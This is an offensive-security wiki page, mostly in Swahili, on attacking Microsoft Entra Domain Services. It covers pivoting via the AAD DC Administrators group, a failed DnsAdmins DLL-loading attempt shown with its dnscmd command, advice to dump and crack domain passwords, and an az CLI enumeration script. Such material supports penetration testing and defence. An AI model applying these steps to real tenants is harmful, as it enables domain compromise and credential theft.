# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## Domain Services

Microsoft Entra Domain Services inaruhusu kupeleka Active Directory ndani ya Azure bila kuhitaji kusimamia Domain Controllers (kwa kweli hata huna ufikiaji kwao).

Lengo lake kuu ni kukuwezesha kuendesha applications za legacy katika cloud ambazo haziwezi kutumia mbinu za kisasa za uthibitisho, au pale ambapo hutaki directory lookups zirudi kila mara kwenye mazingira ya on‑premises AD DS.

Kumbuka kwamba ili kusanidi watumiaji waliotengenezwa katika Entra ID (na ambao hawajasimamiwa kutoka kwa active directories nyingine) kwenda AD domain service unahitaji **kubadilisha password ya mtumiaji** kuwa mpya ili iweze kusanidiwa na AD mpya. Kwa kweli, mtumiaji haisaniswi kutoka Microsoft Entra ID kwenda Domain Services hadi password itakapobadilishwa.

> [!WARNING]
> Hata kama unaunda domain mpya ya active directory hautaweza kuuisimamia kikamilifu (isipokuwa bila kutumia baadhi ya misconfigurations), ambayo inamaanisha kwamba kwa default kwa mfano huwezi kuunda watumiaji moja kwa moja katika AD. Unawaunda kwa **kusanidiwatumiaji kutoka Entra ID.** Unaweza kubainisha kusanidi watumiaji wote (hata wale wamesanidiwa kutoka kwa on‑premise ADs nyingine), watumiaji wa cloud pekee (watumiaji waliotengenezwa katika Entra ID), au hata **kuwapimia zaidi**.

> [!NOTE]
> Kwa ujumla, kutokana na ukosefu wa ufanisi katika usanidi wa domain mpya na ukweli kwamba ADs kwa kawaida tayari ziko on‑premise, hii sio integrasheni kuu kati ya Entra ID na AD, lakini bado ni ya kuvutia kujua jinsi ya kuikomboa.

### Pivoting

Members of the generated `AAD DC Administrators` group wanapewa ruhusa za local admin kwenye VMs ambazo zimejiunga na domain iliyosimamiwa (lakini si kwenye domain controllers) kwa sababu wanaongezwa kwenye local administrators group. Members of this group pia wanaweza kutumia **Remote Desktop to connect remotely to domain-joined VMs**, na pia ni members wa makundi yafuatayo:

- **`Denied RODC Password Replication Group`**: Hii ni group inayobainisha watumiaji na makundi ambao nywila zao haziwezi kuhifadhiwa kwenye RODCs (Read-Only Domain Controllers).
- **`Group Policy Creators Owners`**: Group hii inaruhusu members kuunda Group Policies katika domain. Hata hivyo, members wake hawawezi kuapisha group policies kwa watumiaji au makundi au kuhariri GPOs zilizopo, hivyo si ya kuvutia sana katika mazingira haya.
- **`DnsAdmins`**: Group hii inaruhusu kusimamia settings za DNS na ilitumiwa vibaya zamani ili [escalate privileges and compromise the domain](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins), hata hivyo baada ya kujaribu attack katika mazingira haya ilibainika kuwa udhaifu umepatiwa patch:
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Note that to grant these permissions, inside the AD the group **`AAD DC Administrators`** group is made a member of the previous groups, and also the GPO **`AADDC Computers GPO`** is adding as Local Administrators all the members of the domain group **`AAD DC Administrators`**.

Kupitia kutoka Entra ID kwenda AD iliyoundwa na Domain Services ni rahisi — ingiza tu mtumiaji kwenye kikundi **`AAD DC Administrators`**, ingia kwa RDP kwenye mashine yoyote/nyote kwenye domain na utaweza kuiba data na pia **compromise the domain.**

Hata hivyo, kupita kutoka domain kwenda Entra ID si rahisi kwa sababu hakuna chochote kutoka domain kinachosynchronisewa ndani ya Entra ID. Kila mara angalia metadata ya VMs zote zilizounganishwa, kwani managed identities zao zilizotengwa zinaweza kuwa na ruhusa za kuvutia. Pia **dump all the users passwords from the domain** na jaribu ku-crack ili kisha ku-login kwenye Entra ID / Azure.

> [!NOTE]
> Kumbuka kwamba hapo zamani zilitambuliwa nyufa nyingine katika managed AD hii ambazo ziliruhusu compromise ya DCs, [like this one](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). Mshambulizi akibora DC angeweza kwa urahisi kudumisha persistence bila Azure admins wakiyagundua au hata kuwa na uwezo wa kuiondoa.

### Uorodheshaji
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
